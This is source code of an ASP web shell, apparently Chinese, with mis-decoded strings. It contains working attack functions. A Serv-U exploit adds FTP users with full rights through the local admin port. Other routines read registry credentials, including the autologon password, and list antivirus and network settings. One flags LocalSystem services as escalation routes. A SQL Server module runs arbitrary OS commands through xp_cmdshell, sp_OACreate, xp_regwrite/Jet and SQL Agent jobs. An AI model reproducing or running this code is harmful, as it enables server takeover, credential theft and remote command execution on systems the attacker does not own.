"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
leaves = leaves & "quit" & vbcrlf
on error resume next
set xpost = createobject("MSXML2.XMLHTTP")
xpost.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost.send(leaves)
set xpost=nothing
response.write ("����ɹ�ִ�У���FTP �û���: " & tuser & " " & "����: " & tpass & " ·��: " & tpath & " :)<br><BR>")
else
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
set xpost3 = createobject("MSXML2.XMLHTTP")
xpost3.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost3.send(leaves)
set xpost3=nothing
end if
End Function

Function fuck()
On Error Resume Next
dim wsh
set wsh=createobject("Wscript.Shell")
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
Response.Write"<LI>ϵͳ���֧��:<BR>"
Response.Write"-----------------------------<br>"
if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl�ű�:֧��<br>"
if instr(Pathinfo,"java") Then Response.Write "<li>Java�ű�:֧��<br>"
if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL���ݿ����:֧��<br>"
if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL���ݿ����:֧��<br>"
if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle���ݿ����:֧��<br>"
if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM������:֧��<br>"
if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>��������PcAnywhere����:֧��<br>"
if instr(Pathinfo,"Kill") Then Response.Write "<li>Killɱ�����:֧��<br>"
if instr(Pathinfo,"kav") Then Response.Write "<li>��ɽϵ��ɱ�����:֧��<br>"
if instr(Pathinfo,"antivirus") Then Response.Write "<li>��������ɱ�����:֧��<br>"
if instr(Pathinfo,"rising") Then Response.Write "<li>����ϵ��ɱ�����:֧��<br>"
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "ϵͳ��ǰ·������:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next
end Function

Function  hook()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
	  Response.Write "[����̽��]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
  Notcpipfilter=1
End If
    ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
    Apds=Wsh.RegRead(ApdKey)
    If IsArray(Apds) Then 
      For i=LBound(Apds) To UBound(Apds)-1
        ApdB=Replace(Apds(i),"\Device\","")
        Response.Write "����"&i&"������Ϊ:"&ApdB&"<br>"
        Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
        IPKey=Path&ApdB&"\IPAddress"
        IPaddr=Wsh.Regread(IPKey)
        If IPaddr(0)<>"" Then
          For j=Lbound(IPAddr) to Ubound(IPAddr)
            Response.Write "<li>IP��ַ"&j&"Ϊ:"&IPAddr(j)&"<br>"
          Next
        Else
          Response.Write "<li>IP��ַ�޷���ȡ��û������<br>"
        End if
        GateWayKey=Path&ApdB&"\DefaultGateway"
        GateWay=Wsh.Regread(GateWayKey)
        If isarray(GateWay) Then
          For j=Lbound(Gateway) to Ubound(Gateway)
            Response.Write "<li>����"&j&"Ϊ:"&Gateway(j)&"<br>"
          Next
        Else
          Response.Write "<li>Ĭ�������޷���ȡ��û������<br>"
        End if
        DNSKey=Path&ApdB&"\NameServer"
        DNSstr=Wsh.RegRead(DNSKey)
        If DNSstr<>"" Then
          Response.Write "<li>����DNSΪ:"&DNSstr&"<br>"
        Else
          Response.Write "<li>Ĭ��DNS�޷���ȡ��û������<br>"
        End If
        if Notcpipfilter=1 Then 
          Response.Write "<li>û��Tcp/IPɸѡ<br>"
        else
          ETK="\TCPAllowedPorts"
          EUK="\UDPAllowedPorts"
          FullTCP=Path&ApdB&ETK
          FullUDP=path&ApdB&EUK
          tcpallow=Wsh.RegRead(FullTCP)
          If tcpallow(0)="" or tcpallow(0)=0 Then
            Response.Write "<li>�����TCP�˿�Ϊ:ȫ��<br>"
          Else
            Response.Write "<li>�����TCP�˿�Ϊ:"
            For j = LBound(tcpallow) To UBound(tcpallow)
              Response.Write tcpallow(j)&","
            Next
            Response.Write "<Br>"
          End if
          udpallow=Wsh.RegRead(FullUDP)
          If udpallow(0)="" or udpallow(0)=0 Then
            Response.Write "<li>�����UDP�˿�Ϊ:ȫ��<br>"
          Else
            Response.Write "<li>�����UDP�˿�Ϊ:"
            for j = LBound(udpallow) To UBound(udpallow)
              Response.Write UDPallow(j)&","
            next
            Response.Write "<br>"
          End if
        End if
        Response.Write "------------------------------------------------<br>"
      Next
    end if
	Response.Write "<br><br>[ϵͳ����̽��]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="�޷���ȡ������.<br>"
Response.Write "<li>��ǰ������Ϊ:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Write "<li>Ĭ�Ϲ���Ա�û���Ϊ:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
  Response.Write "<li>�û��Զ�����:δ����<br>"
Else
  Response.Write "<li>�û��Զ�����:����<br>"
  Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
  Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
  Response.Write "<li type=square>�û���:"&Admin&"<br>"
  Response.Write "<li type=square>����:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="��" else disply="��"
Response.Write "<li>�Ƿ���ʾ�ϴε����û�:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml����Ϊ:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>��ǰ�����Ϊ:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
end Function

Function gody()
Response.write "[����������̽��]<br><hr>"
Set objComputer = GetObject("WinNT://.")
    Set sa = Server.CreateObject("Shell.Application")
    objComputer.Filter = Array("Service")
    For Each objService In objComputer
      if objService.Name="Serv-U" Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>����������Serv-U��װ,����LocalSystemȨ������,���Կ�����Ȩ<br>"
        End if
      End if
      if lcase(objService.Name)="apache" Then
        if objService.ServiceAccountName="LocalSystem" Then
          If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
            Response.Write "<li>��ǰWEB������ΪApache.����ֱ����Ȩ<br>"
          Else
            Response.Write " <li>����������Apache�������,����Ȩ��ΪLocalSystem,���Կ���PHPľ��<br>"
          End if
        end if
      End if
      if instr(lcase(objService.Name),"tomcat") Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>����������Tomcat,����LocalSystemȨ������,���Կ���ʹ��Jspľ����Ȩ<br>"
        End if
      End if
       if instr(lcase(objService.Name),"winmail") Then
        if objService.ServiceAccountName="LocalSystem" Then
          Response.Write "<li>����������Magic Winmail,����LocalSystemȨ������,���Բ���WebMailĿ¼,����д��PHPľ��<br>"
        End if
      End if
    Next
      Set fso=Server.Createobject("Scripting.FileSystemObject")
      Sysdrive=left(Fso.GetspecialFolder(2),2)
      servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
      If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
        Response.Write "<li>����pcAnywhere�����ļ�,���Դ�Ĭ��Ŀ¼���ز��ƽ�õ�pcAnywhere����"
      End if
	  end Function

Function sqlabc()
IF SESSION("LOGIN")="" THEN
                           RESPONSE.WRITE "<CENTER><FONT COLOR=RED>û�е�½</FONT></CENTER><BR>"
			   ELSE RESPONSE.WRITE "<CENTER><FONT COLOR=RED>�Ѿ���½</FONT></CENTER><BR>"
END IF
                           RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>�˳���½</FONT></A></CENTER><BR>"

IF REQUEST("SQLAAA")="LOGIN" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & REQUEST.FORM("SERVER") & "," & REQUEST.FORM("PORT") & ";PASSWORD=" & REQUEST.FORM("PASS") & ";UID=" & REQUEST.FORM("NAME")
                       IF ERR.NUMBER=-2147467259 THEN 
                       RESPONSE.WRITE "<FONT COLOR=RED>����Դ���Ӵ������飡</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=-2147217843 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>�û����������������飡</FONT>"
                       RESPONSE.END
                       ELSEIF ERR.NUMBER=0 THEN
                       STRQUERY="SELECT @@VERSION"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF INSTR(RECRESULT(0),"NT 5.0") THEN
		       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000ϵͳ</FONT><BR>"
                       SESSION("SYSTEM")="2000"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.1")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XPϵͳ</FONT><BR>"
                       SESSION("SYSTEM")="XP"
                       ELSEIF INSTR(RECRESULT(0),"NT 5.2")  THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003ϵͳ</FONT><BR>"
                       SESSION("SYSTEM")="2003"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>����ϵͳ</FONT><BR>"
                       SESSION("SYSTEM")="NO"
                       END IF
                       STRQUERY="SELECT IS_SRVROLEMEMBER('SYSADMIN')"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
                       IF RECRESULT(0)=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>��ϲ��SQL SERVER���Ȩ��</FONT><BR>"
                       SESSION("PRI")=1
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>���ƣ�Ȩ�޲������Ʋ���ִ�����</FONT><BR>"
                       SESSION("PRI")=0
                       END IF              
		       SESSION("LOGIN")="YES"
		       SESSION("NAME")=REQUEST.FORM("NAME")
		       SESSION("PASS")=REQUEST.FORM("PASS")
		       SESSION("SERVER")=REQUEST.FORM("SERVER")
		       SESSION("PORT")=REQUEST.FORM("PORT")
                       END IF

ELSEIF REQUEST("SQLAAA")="TEST"  THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2000ϵͳ</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="XP" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS XPϵͳ</FONT><BR>"
                       ELSEIF SESSION("SYSTEM")="2003" THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>WINDOWS 2003ϵͳ</FONT><BR>"
                       ELSE
                       RESPONSE.WRITE "<FONT COLOR=RED>��������ϵͳ</FONT><BR>"
                       END IF
                       IF SESSION("PRI")=1 THEN
                       RESPONSE.WRITE "<FONT COLOR=RED>��ϲ��SQL SERVER���Ȩ��</FONT><BR>"
                       ELSE 
                       RESPONSE.WRITE "<FONT COLOR=RED>���ƣ�Ȩ�޲������Ʋ���ִ�����</FONT><BR>"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")        

                       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_CMDSHELL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN
		       SESSION("XP_CMDSHELL")=1 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. ����!</FONT>"
                       ELSE
		       SESSION("XP_CMDSHELL")=0 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. ������!</FONT>"
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='SP_OACREATE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. ����!</FONT>"
		       SESSION("SP_OACREATE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. ������!</FONT>"
                       SESSION("SP_OACREATE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_REGWRITE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. ����!</FONT>"
		       SESSION("XP_REGWRITE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. ������!</FONT>"
		       SESSION("XP_REGWRITE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_SERVICECONTROL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL ����!</FONT>"
		       SESSION("XP_SERVICECONTROL")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL ������!</FONT>"
		       SESSION("XP_SERVICECONTROL")=0
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('������ʱ�����µ�½��')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>��½��ʱ</FONT>"
                       RESPONSE.END
                       END IF 

ELSEIF REQUEST("SQLAAA")="CMD" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("PRI")=1 THEN
		       IF REQUEST("TOOL")="XP_CMDSHELL" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "EXEC MASTER.DBO.XP_CMDSHELL '" & REQUEST.FORM("CMD") & "'" 
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "����"&REQUEST("TOOL")&"��չִ��"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       END IF 
		       		       
                       ELSEIF REQUEST("TOOL")="SP_OACREATE" THEN 
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C "&REQUEST("CMD")&" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (KEEPNULLS);"
		       ADOCONN.EXECUTE(STRQUERY)
                       STRQUERY = "SELECT * FROM JNC"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
		       RESPONSE.WRITE "����"&REQUEST("TOOL")&"��չִ��"	
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C DEL 8617.TMP'"
 		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

                       ELSEIF REQUEST("TOOL")="XP_REGWRITE" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       PATH="C:\WINNT\SYSTEM32\IAS\IAS.MDB"
                       ELSE
                       PATH="C:\WINDOWS\SYSTEM32\IAS\IAS.MDB"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN
		       CMD=CHR(34)&"CMD.EXE /C "&REQUEST.FORM("CMD")&" > 8617.TMP"&CHR(34)
		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',0;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CMD&")');"
                       ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY = "SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C COPY 8617.TMP JNC.TMP"&CHR(34)&")');BULK INSERT [JNC] FROM 'JNC.TMP' WITH (KEEPNULLS);"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY="SELECT * FROM [JNC];"
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
                       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "����"&REQUEST("TOOL")&"��չִ��"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C DEL 8617.TMP&&DEL JNC.TMP"&CHR(34)&")');"
		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

		       ELSEIF REQUEST("TOOL")="SQLSERVERAGENT" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")

		       IF REQUEST.FORM("CMD")<>"" THEN
                       IF SESSION("SQLSERVERAGENT")=0 THEN
                       STRQUERY = "EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';"
                       ADOCONN.EXECUTE(STRQUERY)
                       SESSION("SQLSERVERAGENT")=1
                       END IF

		       STRQUERY = "USE MSDB CREATE TABLE [JNCSQL](RESULTTXT NVARCHAR(1024) NULL) EXEC SP_DELETE_JOB NULL,'X' EXEC SP_ADD_JOB 'X' EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C "&REQUEST.FORM("CMD")&"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAME EXEC SP_START_JOB 'X';"
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                    
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "����"&REQUEST("TOOL")&"��չִ��"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE VBCRF
                       RESPONSE.WRITE "����չ�޻��ԣ�����ͨ���ض���鿴������"
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "USE MSDB DROP TABLE [JNCSQL];"
                       ADOCONN.EXECUTE(STRQUERY)
                       END IF
                       ELSEIF REQUEST("TOOL")="" THEN 
                       RESPONSE.WRITE "<SCRIPT>ALERT('ѡ����Ҫʹ�õ���չ')</SCRIPT>"
                       END IF
                       ELSE
                       RESPONSE.WRITE "<SCRIPT>ALERT('Ȩ�޲���Ŷ��')</SCRIPT>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('������ʱ�����µ�½��')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>��½��ʱ</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="RESUME" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       IF SESSION("XP_CMDSHELL")=0 THEN
                       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>�Ѿ����Իָ�XP_CMDSHELL</FONT>"
                       ELSEIF SESSION("SP_OACREATE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('SP_OACREATE','ODSOLE70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>�Ѿ����Իָ�SP_OACREATE</FONT>"
		       ELSEIF SESSION("XP_REGWRITE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_REGWRITE','XPSTAR.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>�Ѿ����Իָ�XP_REGWRITE</FONT>"	
		       ELSE RESPONSE.WRITE "<FONT COLOR=RED>��ϲ�������ȫ</FONT>"	
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('������ʱ�����µ�½��')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>��½��ʱ</FONT>"
                       RESPONSE.END
                       END IF 	
                                
ELSEIF REQUEST("SQLAAA")="SQL" THEN
                       IF SESSION("LOGIN")<>"" THEN
		       IF REQUEST.FORM("SQL")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       STRQUERY=REQUEST.FORM("SQL")
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "ִ��SQL���:"
                       RESPONSE.WRITE REQUEST.FORM("SQL") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('������ʱ�����µ�½��')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>��½��ʱ</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="LOGOUT" THEN
                       SET ADOCONN=NOTHING
                       SESSION("LOGIN")=""
                       SESSION("NAME")=""
                       SESSION("PASS")=""
                       SESSION("SERVER")=""
                       SESSION("PORT")=""
                       SESSION("SYSTEM")=""
                       SESSION("PRI")=""		              
END IF
IF SESSION("LOGIN")="" THEN
			   RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>SQL�û�����"
			   RESPONSE.WRITE "<INPUT NAME=NAME TYPE=TEXT ID=NAME VALUE="&SESSION("NAME")&">"
 		           RESPONSE.WRITE "  SQL���룺"
			   RESPONSE.WRITE "<INPUT NAME=PASS TYPE=PASSWORD ID=PASS VALUE="&SESSION("PASS")&">"
			   RESPONSE.WRITE "<P>SQL��������"
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=SERVER VALUE=127.0.0.1>"
 		           RESPONSE.WRITE "  SQL�˿ڣ�"
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=PORT VALUE=1433>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=SUBMIT VALUE=LOGIN>"
			   RESPONSE.WRITE "</FORM>"

ELSE                       RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>�����⣺"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=TEST>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=������>"
			   RESPONSE.WRITE "</FORM>"

                           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>����ָ���"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=RESUME>"
